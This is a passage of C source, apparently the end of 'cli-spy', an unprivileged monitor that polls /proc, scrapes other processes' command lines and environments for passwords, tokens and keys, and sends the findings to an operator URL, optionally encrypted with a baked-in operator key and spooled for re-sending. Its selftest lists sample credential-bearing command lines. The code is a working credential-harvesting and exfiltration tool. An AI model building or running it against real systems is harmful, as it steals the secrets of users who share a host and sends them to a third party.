            const char *key = entry, *val = eq + 1;
            size_t vl = strlen(val);
            if (vl >= 8 && val[0] != '/') {
                int tok = 0;
                for (size_t r = 0; r < NRULES && !tok; r++) {
                    Rule *ru = &g_rules[r];
                    if (ru->bins[0] || ru->capture) continue;
                    if (regexec(&ru->re, val, 0, NULL, 0) == 0) {
                        emit(pid, uid, ru->name, ru->conf, val,
                             key_evidence(key));
                        tok = 1;
                    }
                }
                if (!tok && regexec(&g_envkey_re, key, 0, NULL, 0) == 0 &&
                    shannon(val, vl) >= 4.0)
                    emit(pid, uid, "env-secret-var", 75, val,
                         key_evidence(key));
            }
        }
        i += len + 1;
    }
}

static void process_pid(long pid)
{
    char path[64];
    struct stat st;
    uid_t uid = (uid_t)-1;
    snprintf(path, sizeof path, "/proc/%ld", pid);
    if (stat(path, &st) == 0) uid = st.st_uid;

    snprintf(path, sizeof path, "/proc/%ld/cmdline", pid);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return;
    static char buf[MAX_CMD];
    ssize_t n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0) return;   /* kernel thread / zombie / mid-exec: retry via grace */
    buf[n] = 0;
    st_scans++;

    for (ssize_t i = 0; i < n; i++)
        if (buf[i] == '\0') buf[i] = ' ';
    while (n > 0 && buf[n - 1] == ' ') buf[--n] = '\0';

    run_rules(buf, pid, uid);
    if (opt_env) scan_env(pid, uid);
}

/* Sweep policy: scan every PID we have never seen, and rescan PIDs
 * still in their grace window. Skip established PIDs with one hash
 * lookup. SWEEP_WRAP now means only "seen-table nearly full". */

#define SWEEP_WRAP 1

static int sweep(void)
{
    DIR *d = opendir("/proc");
    if (!d) return -1;
    struct dirent *de;
    while ((de = readdir(d))) {
        if (!isdigit((unsigned char)de->d_name[0])) continue;
        char *end;
        long pid = strtol(de->d_name, &end, 10);
        if (*end || pid <= 0) continue;
        if (g_seen_n > SEEN_SIZE - (SEEN_SIZE / 4)) {
            closedir(d);
            return SWEEP_WRAP;
        }
        long idx = seen_find((uint32_t)pid);
        if (idx >= 0) {
            if ((uint32_t)st_sweeps - g_seen_born[idx] >= GRACE_SCANS)
                continue;                  /* established: skip */
        } else {
            seen_insert((uint32_t)pid, (uint32_t)st_sweeps);
        }
        process_pid(pid);
    }
    closedir(d);
    return 0;
}

/* ---------- selftest ---------- */

static const char *g_samples[] = {
    "sshpass -p Sup3rS3cret ssh admin@prod",
    "mysql -u root -pHunter2 -h db.internal",
    "mysqldump --password=S3cretDump appdb",
    "curl --user alice:SeperateSpace123 https://x/",
    "curl -u deploy:letmein123 https://ci.internal/artefact",
    "psql postgres://svc_reports:Pr0dPass@db:5432/reports",
    "./deploy --token=ghp_a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
    "kubectl --token=eyJhbGciOiJSUzI1NiIs.eyJpc3MiOiJrdWJlcm5ldGVz.c2lnbmF0dXJl get pods",
    "backup --password nightly-rotation-pass",
    "job --session 8fS3kD9xQ2mZ7vB4nC6tY1uI5oP0aW",
    "vault login hvs.AbCdEfGhIjKlMnOpQrStUvWx",
    "mosquitto_pub -P MqttPass123 -h broker -t /x -m hi",
    "curl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9\" http://x/",
    "deploy --token=sk_live_4eC39HqLyjWDarjtT1zdp7dc",
    "docker login -p D0ckerPass123 registry.internal",
    "redis-cli -a R3disAuth -h cache.internal",
    "smbclient //host/share -U admin%SmbPass99",
    "twine upload -u __token__ -p pypi-AgEIcHlwaS5vcmc dist/*",
    "curl --key -----BEGIN PRIVATE KEY----- https://x/",
    "curl --user=ops:s3cret-deploy https://ci.internal/x",
    "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY aws s3 ls",
    "curl -d user=bob&password=test123 https://app.internal/login",
    NULL
};

/* Must produce ZERO findings; guards against FP regressions, which
 * matter more than TP regressions — a noisy sensor gets turned off. */
static const char *g_benign[] = {
    "docker run -p 8080:80 nginx",
    "docker compose -p myproject up -d",
    "docker login --password-stdin",
    "git log --oneline -5",
    "git show d34db33fd34db33fd34db33fd34db33fd34db33f",
    "app --region=eu-west-1 --replicas=3 --verbose",
    "curl --data {\"a\":1} https://api.internal/x",
    "job --sha256=9b71d224bd62f3785d96d46ad3ea3d73319bfbc2890caadae2dff72519673ca7",
    "kubectl apply -f deployment.yaml",
    "curl --cacert /etc/ssl/certs/ca.pem https://x",
    "aws s3 cp s3://bucket/key . --profile prod",
    "helm upgrade --set image.tag=v1.2.3 --set replicas=3 app chart",
    "job --request-id=550e8400-e29b-41d4-a716-446655440000",
    "openssl rand -hex 32",
    NULL
};

static int selftest(void)
{
    for (int i = 0; g_samples[i]; i++) {
        fprintf(stderr, "# sample: %s\n", g_samples[i]);
        run_rules(g_samples[i], 0, getuid());
    }
    size_t pos = g_nf;
    for (int i = 0; g_benign[i]; i++) {
        fprintf(stderr, "# benign: %s\n", g_benign[i]);
        run_rules(g_benign[i], 0, getuid());
    }
    int ok = (pos == 21) && (g_nf - pos == 0);
    fprintf(stderr, "# selftest: %zu positive uniques (expect 21), "
            "%zu benign uniques (expect 0): %s\n",
            pos, g_nf - pos, ok ? "PASS" : "FAIL");
    return ok ? 0 : 1;
}

/* ---------- main ---------- */

static void on_sig(int s) { (void)s; g_stop = 1; }

static void usage(void)
{
    fprintf(stderr,
"cli-spy - passive argv/environment secret monitor (unprivileged)\n"
"usage: cli-spy [options]\n"
"  -i MS    poll interval in milliseconds (default 10)\n"
"  -o FILE  append findings as JSONL to FILE (default stdout; 0600)\n"
"  -u URL   POST each finding to http://host[:port]/path\n"
"  -k FILE  operator public key (64 hex chars) for sealed exfil\n"
"  -e       also scan /proc/PID/environ where readable\n"
"  -r       redact secrets in output (demo mode)\n"
"  -1       single sweep, then exit\n"
"  -t       self-test the detection engine and exit\n"
"  -v       verbose\n"
"  -h       this help\n"
"\n"
"with -u and -o, findings that could not be delivered by shutdown are\n"
"spooled to FILE.unsent (0600) and re-POSTed on the next start; with\n"
"default stdout output there is no spool file and unsent findings are\n"
"dropped with a stderr note.\n");
}

int main(int argc, char **argv)
{
    out = stdout;
    const char *opt_out_path = NULL;

    for (size_t i = 0; i < NRULES; i++) {
        Rule *r = &g_rules[i];
        int fl = REG_EXTENDED | (r->icase ? REG_ICASE : 0);
        if (regcomp(&r->re, r->pattern, fl) != 0) {
            fprintf(stderr, "cli-spy: bad pattern for rule %s\n", r->name);
            return 1;
        }
    }
    if (regcomp(&g_envkey_re,
                "(pass|pwd|token|secret|cred|auth|key|api|session)",
                REG_EXTENDED | REG_ICASE) != 0)
        return 1;
    load_users();

    int c;
    while ((c = getopt(argc, argv, "i:o:u:k:er1tvh")) != -1) {
        switch (c) {
        case 'i': opt_interval_ms = strtol(optarg, NULL, 10);
                  if (opt_interval_ms < 1) opt_interval_ms = 1;
                  break;
        case 'o': {
                  int ofd = open(optarg,
                                 O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC,
                                 0600);
                  if (ofd < 0) { perror(optarg); return 1; }
                  fchmod(ofd, 0600);
                  out = fdopen(ofd, "a");
                  if (!out) { perror(optarg); close(ofd); return 1; }
                  opt_out_path = optarg;
                  } break;
        case 'u': opt_url = optarg; break;
        case 'k': if (seal_init(optarg) != 0) {
                      fprintf(stderr, "cli-spy: cannot load pubkey %s\n",
                              optarg);
                      return 1;
                  } break;
        case 'e': opt_env = 1; break;
        case 'r': opt_redact = 1; break;
        case '1': opt_once = 1; break;
        case 't': return selftest();
        case 'v': opt_verbose = 1; break;
        default:  usage(); return 2;
        }
    }

#ifdef OPERATOR_PUBKEY_HEX
    if (!seal_available() && seal_init_hex(OPERATOR_PUBKEY_HEX) != 0)
        fprintf(stderr, "cli-spy: warning: built-in pubkey invalid\n");
#endif
    if (opt_url && !seal_available())
        fprintf(stderr,
            "cli-spy: WARNING: exfil is PLAINTEXT (no -k, no baked key)\n");
    if (opt_verbose && seal_available())
        fprintf(stderr, "cli-spy: sealed-box exfil enabled\n");

    /* spool path derives from -o: "<outfile>.unsent"; none for stdout */
    if (opt_url && opt_out_path) {
        static char sp[512];
        snprintf(sp, sizeof sp, "%s.unsent", opt_out_path);
        g_spool = sp;
        if (!seal_available())
            fprintf(stderr,
                "cli-spy: WARNING: spool %s will be PLAINTEXT\n", g_spool);
    }

    if (opt_url) {
        if (pthread_create(&q_tid, NULL, sender_main, NULL) != 0) {
            fprintf(stderr, "cli-spy: cannot start exfil sender\n");
            return 1;
        }
        q_started = 1;
        spool_load();           /* no-op unless -o was given */
    }

    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sig;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);

    while (sweep() == SWEEP_WRAP) seen_clear();   /* prime */

    if (!opt_once) {
        struct timespec next;
        clock_gettime(CLOCK_MONOTONIC, &next);
        while (!g_stop) {
            next.tv_sec  += opt_interval_ms / 1000;
            next.tv_nsec += (opt_interval_ms % 1000) * 1000000L;
            if (next.tv_nsec >= 1000000000L) {
                next.tv_nsec -= 1000000000L;
                next.tv_sec++;
            }
            clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next, NULL);
            if (g_stop) break;
            st_sweeps++;
            if (sweep() == SWEEP_WRAP) {
                seen_clear();
                sweep();
            }
            if (st_sweeps % PRUNE_EVERY == 0)
                prune_seen();
            struct timespec now;
            clock_gettime(CLOCK_MONOTONIC, &now);
            if (now.tv_sec > next.tv_sec + 1) next = now;  /* overrun reset */
        }
    }

    exfil_shutdown();   /* drain 8s, then spool (with -o) or drop */

    if (opt_verbose || !opt_once)
        fprintf(stderr,
            "cli-spy: sweeps=%llu scans=%llu hits=%llu unique=%zu\n",
            (unsigned long long)st_sweeps, (unsigned long long)st_scans,
            (unsigned long long)st_hits, g_nf);
    if (out != stdout) fclose(out);
    return 0;
}
